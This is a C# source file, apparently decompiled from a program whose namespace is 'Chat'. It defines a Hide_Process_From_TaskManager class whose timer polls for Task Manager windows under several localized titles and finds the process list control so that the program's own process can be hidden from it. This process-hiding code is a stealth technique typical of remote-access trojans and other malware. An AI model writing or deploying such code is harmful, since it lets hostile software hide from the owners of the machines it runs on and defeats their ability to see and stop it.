namespace Chat
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Windows.Forms;

    [StandardModule]
    internal sealed class Hide_Process_From_TaskManager
    {
        private static string controls;
        public static int Hide_Interval = 100;
        private static IntPtr hwnd;
        private const int LVM_DELETECOLUMN = 0x101c;
        private const int LVM_DELETEITEM = 0x1008;
        private const int LVM_FIRST = 0x1000;
        private const int LVM_GETITEM = 0x104b;
        private const int LVM_GETITEMCOUNT = 0x1004;
        private const int LVM_GETNEXTITEM = 0x100c;
        private const int LVM_SORTITEMS = 0x1030;
        public static string MyProc;
        public static string[] Processes_Names = new string[] { Process.GetCurrentProcess().ProcessName };
        private static IntPtr ProcLV = IntPtr.Zero;
        private static Timer t = new Timer();
        public static string[] Task_Manager_Window_Titles = new string[] { "Administrador de tareas de Windows", "Windows Task Manager", "Windows Task-Manager", "Gestione attivit\x00e0 Windows", "Gestione attivit\x00e0" };

        private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
        {
            string str2 = ObtenerClase(lngHwnd);
            string str3 = ObtenerTextoVentana(lngHwnd);
            if (Strings.InStr(str2, "SysListView32", CompareMethod.Binary) > 0)
            {
                GetItems.GetListView(hwnd, lngHwnd);
                if (Strings.InStr(str3, "Procesos", CompareMethod.Binary) > 0)
                {
                    ProcLV = lngHwnd;
                }
            }
            string str = lngHwnd.ToString() + ", " + str2 + ", " + str3;
            return 1;
        }

        [DllImport("user32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int EnumChildWindows(IntPtr hWndParent, EnumDelegate lpEnumFunc, int lParam);
        [DllImport("user32.dll", EntryPoint="FindWindowA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        private static extern void GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
        [DllImport("user32", EntryPoint="GetWindowTextA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        [DllImport("user32", EntryPoint="GetWindowTextLengthA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);
        private static string ObtenerClase(IntPtr handle)
        {
            StringBuilder lpClassName = new StringBuilder();
            lpClassName.Length = 0xff;
            GetClassName(handle, lpClassName, lpClassName.Length);
            return lpClassName.ToString();
        }

        private static string ObtenerTextoVentana(IntPtr handle)
        {
            StringBuilder lpString = new StringBuilder();
            lpString.Length = GetWindowTextLength(handle) + 1;
            GetWindowText(handle, lpString, lpString.Length);
            return lpString.ToString();
        }

        [DllImport("user32", EntryPoint="SendMessageA", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
        private static extern int SendMessage(IntPtr Hwnd, int wMsg, int wParam, int lParam);
        private static void t_Tick(object sender, EventArgs e)
        {
            if (ProcLV == IntPtr.Zero)
            {
                foreach (string str in Task_Manager_Window_Titles)
                {
                    string lpClassName = null;
                    hwnd = (IntPtr) FindWindow(ref lpClassName, ref str);
                    if (hwnd != IntPtr.Zero)
                    {
                        EnumChildWindows(hwnd, new EnumDelegate(Hide_Process_From_TaskManager.EnumChildWindows), 0);
                    }
                }
            }
            else
            {
                GetItems.GetListView(hwnd, ProcLV);
            }
        }

        public static bool Running
        {
            get
            {
                return t.Enabled;
            }
            set
            {
                if (value)
                {
                    if (Processes_Names.Length == 0)
                    {
                        throw new Exception("Processes_Names Array is empty.");
                    }
                    if (Hide_Interval <= 0)
                    {
                        throw new Exception("Hide_Interval value is too low, minimum value: 1");
                    }
                    MyProc = Processes_Names[0];
                    if (Hide_Process_From_TaskManager.t.Interval != Hide_Interval)
                    {
                        Timer t = Hide_Process_From_TaskManager.t;
                        Hide_Process_From_TaskManager.t.Tick += new EventHandler(Hide_Process_From_TaskManager.t_Tick);
                        t.Interval = Hide_Interval;
                        t.Enabled = true;
                        t.Start();
                        t = null;
                    }
                    else
                    {
                        Hide_Process_From_TaskManager.t.Enabled = true;
                        Hide_Process_From_TaskManager.t.Start();
                    }
                }
                else
                {
                    Hide_Process_From_TaskManager.t.Enabled = false;
                    Hide_Process_From_TaskManager.t.Stop();
                    ProcLV = IntPtr.Zero;
                }
            }
        }

        private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);
    }
}

